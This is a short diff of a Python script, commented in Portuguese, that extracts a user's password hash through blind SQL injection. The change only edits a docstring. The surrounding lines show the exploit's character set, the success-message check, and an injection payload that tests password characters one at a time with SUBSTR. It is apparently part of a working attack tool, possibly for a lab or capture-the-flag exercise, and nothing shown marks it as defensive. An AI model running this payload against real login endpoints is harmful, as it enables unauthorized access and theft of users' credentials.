@@ -10,7 +10,7 @@ def get_user_input():
     return f'{url}/{path}', username
 
 def extract_password(url, username):
-    """Extrai a senha por meio de SQL Injection Blind."""
+    """Extrai o hash da senha por meio de SQL Injection Blind."""
     CHARSET = string.ascii_letters + string.digits + "_"
     SUCCESS = 'Successfully sent password'  # Verifique se esta mensagem é realmente correta
     PAYLOAD = "' AND SUBSTR(password,{},1)='{}' -- -"
